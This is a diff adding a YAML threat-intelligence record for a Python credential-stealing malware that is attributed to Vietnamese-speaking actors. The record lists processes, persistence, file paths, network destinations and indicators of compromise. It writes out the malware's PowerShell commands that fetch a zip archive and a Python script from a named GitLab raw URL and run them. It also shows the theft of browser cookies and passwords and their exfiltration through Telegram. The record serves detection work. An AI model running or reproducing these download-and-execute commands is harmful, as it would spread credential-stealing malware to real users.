@@ -1,0 +1,86 @@
+description: "A Python credential\u2011harvesting tool distributed via social engineering\
+  \ and legitimate code hosting platforms, using multiple downloaders and exfiltration\
+  \ through Telegram Bot API."
+attribution: Unknown Vietnamese speaking threat actor(s)
+malware_families:
+- Python Infostealer
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - python.exe
+  - python3.exe
+  - python39.zip
+  - vn.cmd
+  - WindowsSecure.bat
+  - project.py
+  - rmv.py
+  commandline: 'cmd.exe /c "C:\\Users\\Public\\myFile.zip"
+
+    powershell.exe -Command Expand-Archive -LiteralPath %ZIP_PATH% -DestinationPath
+    C:\Users\Public
+
+    cmd.exe /c "C:\\Users\\Public\\Document.zip"
+
+    powershell.exe -Command Expand-Archive -LiteralPath C:\\Users\\Public\\Document.zip
+    -DestinationPath C:\\Users\\Public\\Document
+
+    powershell.exe -Command Invoke-WebRequest -Uri https://gitlab.com/xjnhza/12b2/home/~raw/master/Document.zip
+    -OutFile C:\\Users\\Public\\Document.zip
+
+    powershell.exe -Command Invoke-WebRequest -Uri https://gitlab.com/xjnhza/12b2/home/~raw/master/project.py
+    -OutFile C:\\Users\\Public\\Document\\project.py
+
+    python.exe C:\\Users\\Public\\Document\\project.py
+
+    '
+  powershell: 'Invoke-WebRequest -Uri https://gitlab.com/xjnhza/12b2/home/~raw/master/Document.zip
+    -OutFile C:\\Users\\Public\\Document.zip
+
+    Invoke-WebRequest -Uri https://gitlab.com/xjnhza/12b2/home/~raw/master/project.py
+    -OutFile C:\\Users\\Public\\Document\\project.py
+
+    '
+  scripting_engine: 'vn.cmd
+
+    WindowsSecure.bat
+
+    '
+  registry_keys:
+  - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSecure
+  image_load: {}
+  network_connections:
+  - process: powershell.exe
+    destination: gitlab.com
+    port: 443
+  - process: python.exe
+    destination: ipinfo.io
+    port: 443
+  - process: python.exe
+    destination: api.telegram.org
+    port: 443
+  file_activity:
+  - C:\\Users\\Public\\myFile.zip
+  - C:\\Users\\Public\\Document.zip
+  - C:\\Users\\Public\\Document\\project.py
+  - C:\\Users\\{user_name}\\AppData\\Local\\Temp\\{country+ip_address}\\cookiefb.txt
+  - C:\\Users\\{user_name}\\AppData\\Local\\Temp\\{country+ip_address}\\{browser}\\cookie.txt
+  - C:\\Users\\{user_name}\\AppData\\Local\\Temp\\{country+ip_address}\\{browser}\\password.txt
+  persistence:
+  - 'Startup Folder: WindowsSecure.bat'
+  process_relations: {}
+IOCs:
+  urls:
+  - https://gitlab.com/xjnhza/12b2/home/~raw/master/Document.zip
+  - https://gitlab.com/xjnhza/12b2/home/~raw/master/project.py
+  - https://ipinfo.io
+  - https://api.telegram.org
+  domains:
+  - gitlab.com
+  - ipinfo.io
+  - api.telegram.org
+authors:
+- Kotaro Ogino
+reference: https://www.cybereason.com/blog/unboxing-snake-python-infostealer-lurking-through-messaging-service
+date_of_publication: October 01, 2025
+file_creation_date: October 01, 2025
